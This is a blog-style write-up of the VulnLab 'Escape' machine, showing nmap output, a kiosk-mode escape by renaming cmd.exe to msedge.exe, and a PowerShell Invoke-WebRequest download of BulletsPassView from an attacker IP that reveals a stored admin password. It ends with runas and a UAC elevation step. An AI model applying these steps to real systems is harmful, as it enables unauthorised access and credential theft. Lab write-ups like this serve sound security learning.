---
title: "Escape | VulnLab — Ever Heard of Windows Kiosk Mode? No? Well, It’s Time to Learn!"
description: "I’m back again! Did you miss me? No? Alright then…😒Time for another VulnLab machine!This time, I ran into something newKiosk Mode(yeah, I had no clue either). No boring overview let’s jump straight in"
pubDate: 2025-02-20
tags: ["Security Research", "Red Team"]
author: "Mohamed Eletrepy (maverick)"
readingTime: 6
coverImage: "https://cdn-images-1.medium.com/max/800/1*4dvFlzcyOY2Dlx947NEutw.jpeg"
---

---

![](https://cdn-images-1.medium.com/max/800/1*4dvFlzcyOY2Dlx947NEutw.jpeg)

### Escape | VulnLab Ever Heard of Windows Kiosk Mode? No? Well, It’s Time to Learn!

> 🔗 [https://api.vulnlab.com/api/v1/share?id=47733c78-6bd0-465a-9f9a-434a890f50e5](https://api.vulnlab.com/api/v1/share?id=47733c78-6bd0-465a-9f9a-434a890f50e5)

**I’m back again! Did you miss me? No? Alright then…** 😒 **Time for another VulnLab machine!** This time, I ran into something new **Kiosk Mode** (yeah, I had no clue either). No boring overview let’s jump straight into scanning!

```bash
# Nmap 7.94SVN scan initiated Thu Feb 20 06:38:45 2025 as: nmap -sCV -oN nmap 10.10.66.176  
Nmap scan report for 10.10.66.176  
Host is up (0.56s latency).  
Not shown: 999 filtered tcp ports (no-response)  
PORT STATE SERVICE VERSION  
3389/tcp open ms-wbt-server Microsoft Terminal Services  
| ssl-cert: Subject: commonName=Escape  
| Not valid before: 2025-02-19T04:38:13  
|_Not valid after: 2025-08-21T04:38:13  
|_ssl-date: 2025-02-20T04:39:26+00:00; -2s from scanner time.  
| rdp-ntlm-info:  
| Target_Name: ESCAPE  
| NetBIOS_Domain_Name: ESCAPE  
| NetBIOS_Computer_Name: ESCAPE  
| DNS_Domain_Name: Escape  
| DNS_Computer_Name: Escape  
| Product_Version: 10.0.19041  
|_ System_Time: 2025-02-20T04:39:23+00:00  
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
|_clock-skew: mean: -2s, deviation: 0s, median: -2s  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done at Thu Feb 20 06:39:28 2025 -- 1 IP address (1 host up) scanned in 43.61 seconds
```

**As you can see, it’s just RDP.** But after trying to log in with `xfreerdp `**hell yeah**, this tool has a ton of options! `/pth`, `/full-resolution`, and so on... **Seriously, this thing has more switches than a hacker's dreams.** Get this!

![](https://cdn-images-1.medium.com/max/800/0*PeD-t4O4hxKkdZVQ.gif)

![](https://cdn-images-1.medium.com/max/1200/1*Yzovc-THve9jyAQwUAli1A.png)

*KiosKUser0*

**Now it’s time to log in using this user!** Because, as you can see, it literally says **“No password needed.”** 😏 Sounds like a trap? Maybe. But hey, who am I to question free access? Let’s roll!

![](https://cdn-images-1.medium.com/max/1200/1*OcTfaXKGVeKGxaj4HijwLw.png)

**This time, I hit the Start key my hacker instincts told me to.** I searched for **Edge** or **CMD**, hoping for some quick wins. **CMD? Nope, blocked.** But guess what? **Edge opened!** Looks like Microsoft wants me to browse my way into privilege escalation. Challenge accepted!

![](https://cdn-images-1.medium.com/max/800/1*Xl_io_cJyK3LbrpGguUmwA.png)

**Inside Edge, I did what any hacker would tried to explore the C: drive.** And boom! **First folder? **`_admin `now that’s some juicy stuff. Right away, I found `profiles.xml`, just like when you get lucky on an SMB share and find a forgotten file. **Classic!**

![](https://cdn-images-1.medium.com/max/1200/1*TpNt2hjr5-Imjp3F49hqFw.png)

I tried to **decrypt it using **`gpp-decrypt`, but nope it didn’t work. **No worries, I’ll deal with it in the next steps.**

**Oh, and if you explore a little deeper, you’ll find the **`user.txt`** flag.** But hey, I’ll let you have that one. 😉 Happy hunting!

![](https://cdn-images-1.medium.com/max/800/0*m38Y1obTNMP0yQ9P.gif)

**Alright, time to bring out the big guns — literally.** 🔫😏 We’ve got a tool called **BulletsPassView**, and guess what? **It uncovers those sneaky bullet-masked passwords like magic.** But first, **download the EXE file** and transfer it to the **Downloads folder** you know, the usual shady business. 😆

Once that’s done, on a Windows machine, just **import the XML file using Remote Desktop Plus**, and boom secrets exposed!

Before opening CMD, you first need to search for it in `C:\Windows\System32`, and once you find `cmd.exe`, clicking on it will download it to your machine. However, since this Kiosk mode only allows `msedge.exe` to run, you need to rename `cmd.exe` to `msedge.exe` to execute your commands freely.

```powershell
PS C:\_admin> Invoke-WebRequest -Uri "http://10.8.5.124/BulletsPassView.exe" -OutFile "C:\Users\KiosKUser0\Downloads\BulletsPassView.exe"  
PS C:\_admin>  
PS C:\_admin> copy C:\Users\kioskUser0\Downloads\BulletsPassView.exe .  
PS C:\_admin> & 'C:\Program Files (x86)\Remote Desktop Plus\rdp.exe'  
PS C:\_admin> .\BulletsPassView.exe
```

![](https://cdn-images-1.medium.com/max/800/1*LkXlKAurEb9fL9OHHh-7eQ.png)

**Now, time for the moment of truth!** As you can see in the command, I **opened BulletsPassView**, and boom **the admin password was just sitting there, chilling.**

With that in hand, I used the `runas`** utility** to log in as admin because, well… **why wouldn’t I?** Time to take this machine to the next level!

**Now, there are many ways to get high privileges,** but I’ll go with the **easiest one** — because, honestly, **it just looks cool to me.** 😎 Plus, if Martin Mielke used it, then hey, why not? Gotta keep it stylish while pwning!

```powershell
  
PS C:\_admin> .\BulletsPassView.exe  
PS C:\_admin> net user  
  
User accounts for \\ESCAPE  
  
-------------------------------------------------------------------------------  
admin Administrator DefaultAccount  
Guest kioskUser0 WDAGUtilityAccount  
The command completed successfully.  
  
PS C:\_admin> net user admin  
User name admin  
Full Name  
Comment  
User's comment  
Country/region code 000 (System Default)  
Account active Yes  
Account expires Never  
  
Password last set 2/3/2024 2:45:01 AM  
Password expires Never  
Password changeable 2/3/2024 2:45:01 AM  
Password required No  
User may change password Yes  
  
Workstations allowed All  
Logon script  
User profile  
Home directory  
Last logon 2/3/2024 4:30:47 AM  
  
Logon hours allowed All  
  
Local Group Memberships *Administrators  
Global Group memberships *None  
The command completed successfully.  
  
PS C:\_admin> runas /user:admin cmd  
Enter the password for admin:  
Attempting to start cmd as user "ESCAPE\admin" ...  
PS C:\_admin>
```

**Alright, so CMD opened as admin… but guess what?** **We still can’t do anything!** That’s because **UAC (User Account Control) is still in the way.**

**And this is exactly why we renamed **`cmd.exe`** before opening it!** ⚡ It wasn’t just for fun **it was necessary to get CMD running in this environment.** But now, we’ve got to **actually bypass UAC** to take full control. Let’s get to it!

after some enumeration steps of what privileg of current user i do

```powershell
C:\>whoami /all  
  
USER INFORMATION  
----------------  
  
User Name SID  
============ ==============================================  
escape\admin S-1-5-21-3698417267-3345840482-3422164602-1001  
  
  
GROUP INFORMATION  
-----------------  
  
Group Name Type SID Attributes  
========================================================= ================ ============ ==================================================  
Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\로컬 계정 및 관리자 그룹 구성원 Well-known group S-1-5-114 Group used for deny only  
BUILTIN\Administrators Alias S-1-5-32-544 Group used for deny only  
BUILTIN\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\INTERACTIVE Well-known group S-1-5-4 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\로컬 계정 Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled group  
LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group  
Mandatory Label\Medium Mandatory Level Label S-1-16-8192  
  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name Description State  
============================= ==================================== ========  
SeShutdownPrivilege Shut down the system Disabled  
SeChangeNotifyPrivilege Bypass traverse checking Enabled  
SeUndockPrivilege Remove computer from docking station Disabled  
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled  
SeTimeZonePrivilege Change the time zone Disabled  
  
  
C:\>powershell  
Windows PowerShell  
Copyright (C) Microsoft Corporation. All rights reserved.  
  
Try the new cross-platform PowerShell https://aka.ms/pscore6  
  
PS C:\> Start-Process cmd.exe -verb runas  
PS C:\>
```

**After running some privilege enumeration, I checked what my current user could actually do.** So I ran:

`C:\> whoami /all`

And here’s what I found:

- **User:** `escape\admin` ✅
- **Group Memberships:** Standard stuff, but **“Administrators — Group used for deny only”** caught my eye.
- **Privileges:** Not much going on, **no juicy SeImpersonate or SeAssignPrimaryToken** 😭, but we do have **SeChangeNotifyPrivilege**, which is always enabled by default.

**Now, here’s the fun part.** Since I’m already in an admin-level account, I just needed to escalate properly. So I dropped into **PowerShell** and tried the classic **UAC bypass move:**

```powershell
PS C:\> Start-Process cmd.exe -verb runas
```

**And boom!** 🎉 The admin shell popped up, giving me full SYSTEM-level access. **Game over, VulnLab!**

After that, I **switched to the Administrator user** and went straight for the `root.txt`** flag.** **And just like that owned!**

![](https://cdn-images-1.medium.com/max/800/0*WNt1RWEYKDHlL261.gif)

---

### Final Recap

There are **many ways** to solve this machine, **crack the password**, and **bypass UAC**, but hey **I’m just at the beginning of my Red Team journey.** So I chose an **easy and effective way** to get the job done while learning **a ton of new things** from this machine. **On to the next one!**

### Attack Path: From Initial Access to Root 🚀

![](https://cdn-images-1.medium.com/max/800/1*JiyzQNbxRjpEMrXsAIIT4A.png)

### Do You Wanna Chat with Maverick?🥂

Don’t forget to follow me on [LinkedIn ](https://www.linkedin.com/in/0xmaverick/)and [Twitter](https://x.com/mavric1337), and give me some respect on [Hack The Box!](https://app.hackthebox.com/profile/1054724) i love chatting with like-minded people, sharing knowledge, and learning from everyone. Happy hacking! 🚀

![](https://cdn-images-1.medium.com/max/800/0*UKSjCWHCU4sFu1PF.gif)

By Mohamed Eletreby on February 20, 2025.

Canonical link

Exported from Medium on April 20, 2026.